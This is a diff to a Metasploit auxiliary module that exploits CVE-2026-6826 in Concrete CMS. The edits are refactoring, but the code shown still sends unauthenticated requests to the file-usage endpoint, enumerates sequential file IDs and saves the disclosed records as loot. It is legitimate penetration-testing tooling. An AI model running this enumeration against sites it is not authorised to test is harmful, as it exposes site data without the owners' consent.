@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://dailycve.com/concrete-cms-unauthenticated-file-usage-disclosure-cve-2026-6826-medium/']
         ],
         'DisclosureDate' => '2026-05-21',
+        'DefaultOptions' => { 'RPORT' => 80 },
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
@@ -45,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options([
-      Opt::RPORT(80),
       OptString.new('TARGETURI', [true, 'Base path to the Concrete CMS application', '/']),
       OptInt.new('FID_START', [true, 'First file ID to enumerate', 1]),
       OptInt.new('COUNT', [true, 'Number of sequential file IDs to enumerate', 50])
@@ -59,7 +59,10 @@ class MetasploitModule < Msf::Auxiliary
   def usage_table(res)
     return unless res&.code == 200
 
-    doc = res.get_html_document
+    # The usage endpoint returns UTF-8 fragments without an embedded charset.
+    utf8_response = res.dup
+    utf8_response.body = res.body.to_s.dup.force_encoding(::Encoding::UTF_8)
+    doc = utf8_response.get_html_document
     return unless doc
 
     doc.search('div.ccm-ui table.table-striped').find do |table|
@@ -91,14 +94,14 @@ class MetasploitModule < Msf::Auxiliary
     # Detect the missing permission check on the first ID before enumerating.
     probe = send_request_cgi('method' => 'GET', 'uri' => usage_uri(datastore['FID_START']))
     unless probe
-      print_error("#{peer} - No response from #{usage_uri(datastore['FID_START'])}")
+      print_error("No response from #{usage_uri(datastore['FID_START'])}")
       return
     end
     unless usage_table(probe)
-      print_error("#{peer} - File usage dialog is not anonymously reachable (patched or not Concrete CMS)")
+      print_error('File usage dialog is not anonymously reachable (patched or not Concrete CMS)')
       return
     end
-    print_good("#{peer} - Unauthenticated file usage dialog is exposed (CVE-2026-6826)")
+    print_good('Unauthenticated file usage dialog is exposed (CVE-2026-6826)')
 
     table = Rex::Text::Table.new(
       'Header' => 'Concrete CMS file usage',
@@ -119,11 +122,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if found.zero?
-      print_status("#{peer} - Endpoint exposed but no file references found in IDs #{datastore['FID_START']}-#{datastore['FID_START'] + datastore['COUNT'] - 1}")
+      print_status("Endpoint exposed but no file references found in IDs #{datastore['FID_START']}-#{datastore['FID_START'] + datastore['COUNT'] - 1}")
       return
     end
 
-    print_good("#{peer} - Disclosed #{found} file usage record(s)")
+    print_good("Disclosed #{found} file usage record(s)")
     print_line(table.to_s)
 
     loot_path = store_loot(
@@ -134,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
       'concrete_cms_file_usage.csv',
       'Concrete CMS unauthenticated file usage disclosure (CVE-2026-6826)'
     )
-    print_good("#{peer} - Loot saved to: #{loot_path}")
+    print_good("Loot saved to: #{loot_path}")
 
     report_vuln(
       host: rhost,
